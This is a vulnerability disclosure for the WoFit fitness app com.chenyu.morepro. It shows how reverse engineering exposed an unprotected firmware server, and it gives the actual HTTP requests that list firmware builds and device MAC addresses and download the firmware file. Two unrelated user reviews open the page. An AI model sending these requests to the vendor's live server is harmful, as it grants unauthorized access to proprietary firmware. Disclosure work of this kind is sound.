It is very convenient, as long as the mobile phone is on the body, the number of walking steps will be automatically recorded, and the exercise intensity will be intelligently calculated based on data such as moving distance and steps per minute.

![Author image](images/avatars/user-05.jpg)

I really like the app. I like to challenge myself & check my steps, miles, floors climbed, etc., every day. I'm not very savvy on all the other stuff, but these little things satisfy me. I like to see how I slept & check my heart rate when I'm active.

# Vulnerability Report - com.chenyu.morepro- Incorrect Access Control

**Product:** `com.chenyu.morepro`

**Vendor:** [WoFit](http://wo-smart.com/)

**Version:** 7.2.3

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.chenyu.morepro` , developed by **Wo-Smart**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `queryDeviceOTAConfigInfo` method in the `QueryDeviceInfoService` class and the `BaseUrl` String value in the `FitupHttpUtil` class provide the necessary URL and other information required for the HTTP request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   [![image-20241003103409408](https://camo.githubusercontent.com/e6bef1eaa7481c3ce2668aefbb1c8fc0952166c0bb039a619ade8cb78d17cce8/68747470733a2f2f73322e6c6f6c692e6e65742f323032342f31302f30332f56345039734d4965547a376a4655332e706e67)](https://camo.githubusercontent.com/e6bef1eaa7481c3ce2668aefbb1c8fc0952166c0bb039a619ade8cb78d17cce8/68747470733a2f2f73322e6c6f6c692e6e65742f323032342f31302f30332f56345039734d4965547a376a4655332e706e67)
2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```
   GET https://apisvr.wo-smart.com:7443/static/version_android.json HTTP/1.1
   Host: apisvr.wo-smart.com:7443

   Content-Length: 0
   ```
   > Response:

           "versionCode": 60310,
           "versionName": "5.6.3.10",
           "assignDevice": true,
           "deviceMacs": [
               "66:06:4c:00:0b:9d",
               "test"
           ],
           "upgradeDes": "TK79 upgrade",
           "fileUrl": "static/app_MP_TK79_5.6.3.10_ded9c2aa-6ad981c10c63b9b8a813444b860a1eae.bin"
       },
       "32510&OTA&TK79": {
           "versionCode": 60310,
           "versionName": "5.6.3.10",
           "assignDevice": true,
           "deviceMacs": [
               "66:06:4C:00:0B:89"
           ],
           "upgradeDes": "TK79 upgrade",
           "fileUrl": "static/app_MP_TK79_5.6.3.10_ded9c2aa-6ad981c10c63b9b8a813444b860a1eae.bin"
       },
        ......
   ```

   Then, contact the `fileUrl` with `BaseUrl`, we can access the firmware directly.

   ```
   GET https://apisvr.wo-smart.com:7443/static/app_MP_TK79_5.6.3.10_ded9c2aa-6ad981c10c63b9b8a813444b860a1eae.bin
   HTTP/1.1
   Host: apisvr.wo-smart.com:7443
   Content-Type: text/plain
   ```
3. Consequently, the unprotected firmware can be directly downloaded using this information.
